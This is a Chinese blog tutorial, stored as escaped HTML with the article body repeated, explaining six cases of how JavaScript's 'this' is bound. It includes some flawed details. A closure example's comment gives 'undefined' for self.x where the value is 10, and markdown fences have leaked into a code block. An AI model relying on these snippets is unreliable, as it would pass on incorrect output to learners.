class=\"comment\">//10</span></span><br></pre></td></tr></table></figure>\n<p>上述代码，如果函数作为构造函数使用，那么其中的 this 就代表它即将 new 出来的对象。</p>\n<p>但是如果直接调用 Foo 函数，而不是 new Foo()，那就变成情况1，这时候 Foo() 就变成普通函数。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Window</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = Foo();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foo.x);      <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"情况3：对象方法\"><a href=\"#情况3：对象方法\" class=\"headerlink\" title=\"情况3：对象方法\"></a>情况3：对象方法</h3><p>如果函数作为对象的方法时，方法中的 this 指向该对象。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);       <span class=\"comment\">//Object</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);      <span class=\"comment\">//10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<p>注意：若是在对象方法中定义函数，那么情况就不同了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);      <span class=\"comment\">//Window</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);    <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        f();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<p>函数 f 虽然是在 obj.foo 内部定义的，但它仍然属于一个普通函数，this 仍指向 window。(这是个坑，要记牢)  </p>\n<p>在这里，如果想要调用上层作用域中的变量，这里指 obj.x，可以使用闭包。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> self = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(self);      <span class=\"comment\">//&#123;x: 10&#125;</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(self.x);    <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        f();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果 foo 函数不作为对象方法被调用，那么结果也不一样。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);       <span class=\"comment\">//Window</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);     <span class=\"comment\">//undefined</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = obj.foo;</span><br><span class=\"line\">fn();</span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">` </span><br><span class=\"line\"></span><br><span class=\"line\">obj.foo 被赋值给一个全局变量，并没有作为 obj 的一个属性被调用，那么此时 this 的值是 window。</span><br><span class=\"line\"></span><br><span class=\"line\">### 情况4：构造函数 prototype 属性</span><br><span class=\"line\"></span><br><span class=\"line\">`</span><span class=\"string\">``</span>javascript</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.prototype.getX = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);        <span class=\"comment\">//Foo &#123;x: 10, getX: function&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);      <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"keyword\">new</span> Foo();</span><br><span class=\"line\">foo.getX();</span><br></pre></td></tr></table></figure>\n<p>在 Foo.prototype.getX 函数中，this 指向的 foo 对象。不仅仅如此，即便是在整个原型链中，this 代表的也是当前对象的值。</p>\n<h3 id=\"情况5：函数用-call、apply或者-bind-调用。\"><a href=\"#情况5：函数用-call、apply或者-bind-调用。\" class=\"headerlink\" title=\"情况5：函数用 call、apply或者 bind 调用。\"></a>情况5：函数用 call、apply或者 bind 调用。</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);     <span class=\"comment\">//&#123;x: 10&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);   <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.call(obj);</span><br><span class=\"line\">foo.apply(obj);</span><br><span class=\"line\">foo.bind(obj)();</span><br></pre></td></tr></table></figure>\n<p>当一个函数被 call、apply 或者 bind 调用时，this 的值就取传入的对象的值。</p>\n<h3 id=\"情况6-DOM-event-this\"><a href=\"#情况6-DOM-event-this\" class=\"headerlink\" title=\"情况6: DOM event this\"></a>情况6: DOM event this</h3><p>在一个 HTML DOM 事件处理程序里，this 始终指向这个处理程序所绑定的 HTML DOM 节点：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>  <span class=\"title\">Listener</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"keyword\">this</span>.handleClick);     <span class=\"comment\">//不是指这里的 this，这里的 this 指向 Listener 这个对象。</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Listener.prototype.handleClick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//&lt;div id=\"foo\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> listener = <span class=\"keyword\">new</span> Listener();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).click();</span><br></pre></td></tr></table></figure>\n<p>你也可以用通过 bind 切换上下文:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>  <span class=\"title\">Listener</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"keyword\">this</span>.handleClick.bind(<span class=\"keyword\">this</span>));      </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Listener.prototype.handleClick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Listener &#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> listener = <span class=\"keyword\">new</span> Listener();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).click();</span><br></pre></td></tr></table></figure>\n<p>总结一句话，就是 this 指向调用该方法的对象。</p>\n<h2 id=\"其它：\"><a href=\"#其它：\" class=\"headerlink\" title=\"其它：\"></a>其它：</h2><ul>\n<li>this 为保留字，你不能重写 this。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> <span class=\"keyword\">this</span> = &#123;&#125;;     <span class=\"comment\">//Uncaught SyntaxError: Unexpected token this</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>宿主对象：</li>\n</ul>\n<blockquote>\n<p>一门语言在运行的时候，需要一个环境，叫做宿主环境。  </p>\n<p>对于JavaScript，宿主环境最常见的是web浏览器，浏览器提供了一个JavaScript运行的环境，这个环境里面，需要提供一些接口，好让JavaScript引擎能够和宿主环境对接。  </p>\n<p>JavaScript引擎才是真正执行JavaScript代码的地方，常见的引擎有V8(目前最快JavaScript引擎、Google生产)、JavaScript core。</p>\n</blockquote>\n<p>在浏览器或者服务端( nodejs )都有自己的 JS 引擎，在浏览器中，全局对象为 window，而在 nodejs 中，全局对象为 global。 </p>\n<p>参考链接： </p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000002640298#articleHeader1\" target=\"_blank\" rel=\"external\">JavaScript中的this陷阱的最全收集–没有之一</a>  </li>\n<li><a href=\"http://www.cnblogs.com/wangfupeng1988/p/3988422.html\" target=\"_blank\" rel=\"external\">深入理解javascript原型和闭包（10）——this</a></li>\n</ul>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>谈及 Javascript 中的 this，竟然让人觉得头疼，它不像 Java，C++ 中的 this 指向调用 this 的该对象。</p>\n<p>在函数中 this 到底取何值，是在函数真正被调用执行的时候确定下来的，函数定义的时候确定不了。  </p>\n<p>因为 this 的取值是执行上下文环境的一部分，每次调用函数，都会产生一个新的执行上下文环境。</p>\n<p><strong>因为 this 的取值是执行上下文环境的一部分，当你在代码中使用了 this,这个 this 的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻。</strong></p>\n<p>关于 this 的取值，大体上可以分为以下六种情况：</p>\n<h3 id=\"情况1：全局-amp-调用普通函数\"><a href=\"#情况1：全局-amp-调用普通函数\" class=\"headerlink\" title=\"情况1：全局 &amp; 调用普通函数\"></a>情况1：全局 &amp; 调用普通函数</h3><p>在全局环境中，this永远指向window。 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span> === <span class=\"built_in\">window</span>);     <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>普通函数在调用时候(注意不是构造函数，前面不加 new)，其中的 this 也是指向 window。  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);     <span class=\"comment\">//Window</span></span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);   <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<h3 id=\"情况2：构造函数\"><a href=\"#情况2：构造函数\" class=\"headerlink\" title=\"情况2：构造函数\"></a>情况2：构造函数</h3><p>所谓的构造函数就是由一个函数 new 出来的对象，一般构造函数的函数名首字母大写，例如像 Object，Function，Array 这些都属于构造函数。</p>\n<blockquote>\n<p>关于构造函数和普通函数使用上的区别，我在 <a href=\"http://www.happylindz.com/2016/02/23/record-front-questions/\">「前端 · 面试」记录一些有意思的题目(二)</a> 讲的挺全面得了，这里不再赘述。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Foo &#123;x:10&#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"keyword\">new</span> Foo();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foo.x);      <span class=\"comment\">//10</span></span><br></pre></td></tr></table></figure>\n<p>上述代码，如果函数作为构造函数使用，那么其中的 this 就代表它即将 new 出来的对象。</p>\n<p>但是如果直接调用 Foo 函数，而不是 new Foo()，那就变成情况1，这时候 Foo() 就变成普通函数。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Window</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = Foo();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foo.x);      <span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"情况3：对象方法\"><a href=\"#情况3：对象方法\" class=\"headerlink\" title=\"情况3：对象方法\"></a>情况3：对象方法</h3><p>如果函数作为对象的方法时，方法中的 this 指向该对象。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);       <span class=\"comment\">//Object</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);      <span class=\"comment\">//10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<p>注意：若是在对象方法中定义函数，那么情况就不同了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);      <span class=\"comment\">//Window</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);    <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        f();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<p>函数 f 虽然是在 obj.foo 内部定义的，但它仍然属于一个普通函数，this 仍指向 window。(这是个坑，要记牢)  </p>\n<p>在这里，如果想要调用上层作用域中的变量，这里指 obj.x，可以使用闭包。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> self = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(self);      <span class=\"comment\">//&#123;x: 10&#125;</span></span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(self.x);    <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        f();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果 foo 函数不作为对象方法被调用，那么结果也不一样。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span>,</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);       <span class=\"comment\">//Window</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);     <span class=\"comment\">//undefined</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = obj.foo;</span><br><span class=\"line\">fn();</span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">` </span><br><span class=\"line\"></span><br><span class=\"line\">obj.foo 被赋值给一个全局变量，并没有作为 obj 的一个属性被调用，那么此时 this 的值是 window。</span><br><span class=\"line\"></span><br><span class=\"line\">### 情况4：构造函数 prototype 属性</span><br><span class=\"line\"></span><br><span class=\"line\">`</span><span class=\"string\">``</span>javascript</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">10</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.prototype.getX = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);        <span class=\"comment\">//Foo &#123;x: 10, getX: function&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);      <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"keyword\">new</span> Foo();</span><br><span class=\"line\">foo.getX();</span><br></pre></td></tr></table></figure>\n<p>在 Foo.prototype.getX 函数中，this 指向的 foo 对象。不仅仅如此，即便是在整个原型链中，this 代表的也是当前对象的值。</p>\n<h3 id=\"情况5：函数用-call、apply或者-bind-调用。\"><a href=\"#情况5：函数用-call、apply或者-bind-调用。\" class=\"headerlink\" title=\"情况5：函数用 call、apply或者 bind 调用。\"></a>情况5：函数用 call、apply或者 bind 调用。</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    x: <span class=\"number\">10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);     <span class=\"comment\">//&#123;x: 10&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);   <span class=\"comment\">//10</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.call(obj);</span><br><span class=\"line\">foo.apply(obj);</span><br><span class=\"line\">foo.bind(obj)();</span><br></pre></td></tr></table></figure>\n<p>当一个函数被 call、apply 或者 bind 调用时，this 的值就取传入的对象的值。</p>\n<h3 id=\"情况6-DOM-event-this\"><a href=\"#情况6-DOM-event-this\" class=\"headerlink\" title=\"情况6: DOM event this\"></a>情况6: DOM event this</h3><p>在一个 HTML DOM 事件处理程序里，this 始终指向这个处理程序所绑定的 HTML DOM 节点：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>  <span class=\"title\">Listener</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"keyword\">this</span>.handleClick);     <span class=\"comment\">//不是指这里的 this，这里的 this 指向 Listener 这个对象。</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Listener.prototype.handleClick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//&lt;div id=\"foo\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> listener = <span class=\"keyword\">new</span> Listener();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).click();</span><br></pre></td></tr></table></figure>\n<p>你也可以用通过 bind 切换上下文:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 